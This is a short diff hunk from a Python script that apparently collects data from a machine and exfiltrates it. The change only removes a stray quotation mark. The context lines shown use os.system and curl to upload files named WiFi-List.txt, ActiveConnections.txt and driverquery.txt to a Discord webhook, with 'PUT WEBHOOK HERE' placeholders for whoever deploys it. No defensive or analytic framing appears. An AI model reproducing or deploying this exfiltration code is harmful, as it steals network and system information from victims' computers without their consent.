@@ -85,6 +85,6 @@ os.system('''curl -i -H 'Expect: application/json' -F file=@Files\WiFi-List.txt 
 
 os.system('''curl -i -H 'Expect: application/json' -F file=@Files\ActiveConnections.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
 
-os.system('''curl -i -H 'Expect: application/json' -F file=@Files\driverquery.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE''')
+os.system('''curl -i -H 'Expect: application/json' -F file=@Files\driverquery.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' https://discord.com/api/webhooks/WEBHOOK''') # PUT WEBHOOK HERE
 
 exit()
